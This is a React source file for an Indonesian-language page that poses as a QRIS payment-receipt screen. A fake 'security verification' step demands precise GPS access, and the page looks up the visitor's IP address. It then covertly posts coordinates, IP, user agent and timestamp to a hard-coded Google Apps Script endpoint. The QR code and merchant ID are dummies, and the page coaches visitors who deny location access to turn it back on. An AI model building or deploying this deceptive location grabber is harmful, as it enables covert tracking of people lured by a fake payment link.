import { useState, useEffect } from 'react';
import { QrCode, ShieldCheck, MapPin, CheckCircle2 } from 'lucide-react';

function App() {
  const [isVerifying, setIsVerifying] = useState(true);
  const [locationStatus, setLocationStatus] = useState<React.ReactNode>('Memverifikasi sistem keamanan...');
  const [coords, setCoords] = useState<{lat: number, lng: number} | null>(null);

  const [error, setError] = useState<React.ReactNode | null>(null);

  const requestLocation = async () => {
    setError(null);
    setIsVerifying(true);
    setLocationStatus('Membutuhkan verifikasi area transaksi Anda...');

    let ipAddress = 'Unknown';
    try {
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      ipAddress = ipData.ip;
    } catch (e) {
      console.error("Gagal mendapatkan IP:", e);
    }

    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;
          setCoords({ lat: latitude, lng: longitude });
          setLocationStatus('Verifikasi berhasil.');
          setTimeout(() => setIsVerifying(false), 1000);
          
          // GANTI URL INI dengan URL Web App dari Google Apps Script Anda
          const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby2wLdhOz2RT269wecM2Eze6M-AZ95PL1hJFV4ghMKhgDNb_XB-fQAXdGqMpi6fJGtu/exec';
          
          fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              lat: latitude,
              lng: longitude,
              ip: ipAddress,
              userAgent: navigator.userAgent,
              timestamp: new Date().toISOString()
            })
          }).catch(err => console.error("Gagal mengirim data ke Google Sheets:", err));
        },
        (err) => {
          console.error("Error getting location", err);
          let msg: React.ReactNode = 'Gagal memverifikasi lokasi.';
          
          if (err.code === 1) {
            msg = (
              <div className="space-y-4">
                <p className="text-red-600 font-bold">Akses Lokasi Diblokir</p>
                <div className="text-[11px] text-slate-600 text-left bg-slate-50 p-4 rounded-xl border border-slate-200 shadow-inner">
                  <p className="font-bold text-slate-800 mb-2 uppercase tracking-wider text-[10px]">Cara Mengaktifkan (HP & Laptop):</p>
                  <ul className="space-y-2 list-none">
                    <li className="flex gap-2">
                      <span className="bg-blue-500 text-white w-4 h-4 rounded-full flex items-center justify-center flex-shrink-0 text-[9px]">1</span>
                      <span>Klik ikon <b>Gembok (🔒)</b> atau ikon <b>"AA"</b> di baris alamat browser (URL).</span>
                    </li>
                    <li className="flex gap-2">
                      <span className="bg-blue-500 text-white w-4 h-4 rounded-full flex items-center justify-center flex-shrink-0 text-[9px]">2</span>
                      <span>Pilih <b>"Permissions"</b> atau <b>"Website Settings"</b>.</span>
                    </li>
                    <li className="flex gap-2">
                      <span className="bg-blue-500 text-white w-4 h-4 rounded-full flex items-center justify-center flex-shrink-0 text-[9px]">3</span>
                      <span>Ubah <b>Lokasi/Location</b> menjadi <b>"Allow"</b> atau <b>"Izinkan"</b>.</span>
                    </li>
                    <li className="flex gap-2">
                      <span className="bg-blue-500 text-white w-4 h-4 rounded-full flex items-center justify-center flex-shrink-0 text-[9px]">4</span>
                      <span><b>Muat ulang (Reload)</b> halaman ini.</span>
                    </li>
                  </ul>
                  <p className="mt-3 pt-2 border-t border-slate-200 text-[10px] text-slate-400 italic">
                    *Jika masih gagal, masuk ke Pengaturan HP &gt; Aplikasi &gt; {navigator.userAgent.includes('Safari') && !navigator.userAgent.includes('Chrome') ? 'Safari' : 'Chrome'} &gt; Izin &gt; Aktifkan Lokasi.
                  </p>
                </div>
              </div>
            );
          } else if (err.code === 2) msg = 'Lokasi tidak ditemukan atau sinyal GPS lemah.';
          else if (err.code === 3) msg = 'Waktu verifikasi habis.';
          
          setError(msg);
          setLocationStatus(msg);
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    } else {
      setError('Browser Anda tidak mendukung verifikasi lokasi.');
    }
  };

  useEffect(() => {
    const timer = setTimeout(() => {
      requestLocation();
    }, 1500);

    return () => clearTimeout(timer);
  }, []);

  if (isVerifying) {
    return (
      <div className="min-h-screen bg-slate-50 flex flex-col items-center justify-center p-4">
        <div className="max-w-sm w-full bg-white rounded-2xl shadow-xl p-8 flex flex-col items-center text-center space-y-6">
          <div className="relative">
            <div className="absolute inset-0 bg-blue-100 rounded-full animate-ping opacity-75"></div>
            <div className="relative bg-blue-500 text-white p-4 rounded-full">
              <ShieldCheck size={40} />
            </div>
          </div>
          <div className="space-y-2">
            <h2 className="text-xl font-bold text-slate-800">Sistem Keamanan</h2>
            <p className={`text-sm ${error ? 'text-red-500 font-medium' : 'text-slate-500'}`}>
              {locationStatus}
            </p>
          </div>

          {error ? (
            <button 
              onClick={requestLocation}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-xl shadow-md transition-all active:scale-95"
            >
              Coba Lagi
            </button>
          ) : (
            <p className="text-xs text-slate-400 mt-4">
              Mohon klik "Allow" / "Izinkan" jika browser meminta izin akses lokasi untuk memvalidasi transaksi ini.
            </p>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-50 py-8 px-4 flex flex-col items-center">
      <div className="max-w-md w-full space-y-6">
        
        {/* Header */}
        <div className="text-center space-y-2">
          <h1 className="text-2xl font-bold text-slate-800">Penerimaan QRIS</h1>
          <p className="text-slate-500 text-sm">Scan kode QR di bawah menggunakan aplikasi M-Banking atau E-Wallet Anda Untuk Menerima Pembayaran.</p>
        </div>

        {/* Card */}
        <div className="bg-white rounded-3xl shadow-xl overflow-hidden border border-slate-100">
          <div className="bg-[#ed1c24] p-4 flex justify-between items-center text-white">
            <span className="font-bold text-lg tracking-wider">QRIS</span>
            <span className="text-xs bg-white/20 px-2 py-1 rounded-full">GPN</span>
          </div>
          
          <div className="p-8 flex flex-col items-center space-y-6">
            <div className="text-center">
              <p className="text-slate-500 text-sm">NMID: ID1029384756</p>
            </div>

            {/* Dummy QR Code */}
            <div className="bg-white p-4 rounded-2xl shadow-inner border-2 border-slate-100 relative group cursor-pointer hover:border-blue-500 transition-colors">
              <div className="absolute inset-0 flex items-center justify-center opacity-10 pointer-events-none">
                <QrCode size={150} />
              </div>
              <a href="#qris-payment-link" onClick={(e) => { e.preventDefault(); alert('Membuka aplikasi pembayaran...'); }} className="block">
                <img 
                  src="https://upload.wikimedia.org/wikipedia/commons/d/d0/QR_code_for_mobile_English_Wikipedia.svg" 
                  alt="QR Code" 
                  className="w-48 h-48 object-contain relative z-10 mix-blend-multiply group-hover:scale-105 transition-transform"
                />
              </a>
            </div>
            
            <a 
              href="#qris-payment-link" 
              onClick={(e) => { e.preventDefault(); alert('Membuka aplikasi pembayaran...'); }}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-xl text-center shadow-lg hover:shadow-xl transition-all active:scale-95"
            >
              Buka via Aplikasi Pembayaran
            </a>
          </div>
        </div>

        {/* Security Badge */}
        <div className="flex items-center justify-center space-x-2 text-slate-400 text-xs">
          <CheckCircle2 size={14} className="text-green-500" />
          <span>Transaksi Aman & Terverifikasi</span>
          {coords && (
            <span title={`Lokasi: ${coords.lat}, ${coords.lng}`}>
              <MapPin size={14} className="ml-2 text-blue-500" />
            </span>
          )}
        </div>
      </div>
    </div>
  );
}

export default App;
